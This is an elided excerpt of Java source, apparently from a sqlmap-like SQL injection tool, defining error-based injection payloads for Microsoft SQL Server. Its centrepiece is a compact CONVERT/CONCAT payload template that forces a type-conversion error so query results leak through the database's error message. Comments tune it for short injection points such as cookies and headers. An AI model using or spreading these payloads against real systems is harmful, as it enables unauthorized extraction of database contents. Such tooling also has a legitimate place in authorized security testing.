...
public class MssqlDialect implements DbmsDialect {
    ...
    public String errorTestQuery() {
        ...
        // DB_NAME() is never null, but ISNULL adds safety for edge cases.
        return "SELECT ISNULL(DB_NAME(),CHAR(49))";
    }
    ...
    public List<String> errorFunctions() {
        ...
        return List.of(
                ...
                // Level 1: Compact CONVERT without markers — for character-limited injection
                // points (cookies, headers, truncating queries). Much shorter payload.
                // Data extracted via STATIC_EXTRACTION_PATTERNS:
                //   "Conversion failed when converting the nvarchar value '~DATA' to data type int."
                // CONCAT(CHAR(126),(%s)) prepends '~' to FORCE the CONVERT to always error —
                // even when (%s) returns a pure numeric value. CONCAT auto-converts all args
                // to NVARCHAR (SQL Server 2012+). The leading '~' is stripped after extraction.
                "1=CONVERT(int,CONCAT(CHAR(126),(%s)))",
    ...
    public List<String> errorFunctionsForLevel(int level) {
        ...
        // sqlmap: L1=IN+compact, L2=+CONVERT(markers)+CONCAT
        if (level >= 2) return all;
        return all.subList(0, 2); // Level 1: IN (with markers) + compact CONVERT
    }
